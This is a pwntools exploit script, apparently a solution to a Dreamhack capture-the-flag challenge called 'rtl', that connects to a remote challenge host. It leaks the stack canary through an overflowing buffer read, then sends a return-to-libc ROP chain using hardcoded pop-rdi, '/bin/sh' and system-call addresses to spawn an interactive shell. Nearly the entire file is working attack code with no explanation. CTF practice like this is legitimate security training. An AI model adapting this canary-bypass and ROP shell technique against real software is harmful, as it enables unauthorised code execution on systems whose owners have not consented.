#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./rtl', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
set follow-fork-mode parent
b *main+140
b *main+209
b *main+239
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 9858)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def send_buf(data):
    s(data)
    io.recvuntil(b'Buf: ')

binsh = pack(0x400874)
poprdi_ret = pack(0x0000000000400853)
ret = pack(0x0000000000400854)
call_system = pack(0x0000000000400754)
padding_canary = 0x38
padding_return = 0x48
leak_canary = b'a' * (padding_canary - 4) + b'LEAK:'

io = start()
io.recvuntil(b'Buf: ')

send_buf(leak_canary)
io.recvuntil(b'LEAK:')
canary = unpack(b'\x00' + io.recvn(7))
success(f"canary @ {hex(canary)}")

payload = b'a' * padding_canary + pack(canary) + b'a' * (padding_return - padding_canary - 8) + poprdi_ret + binsh + call_system
send_buf(payload)

io.interactive()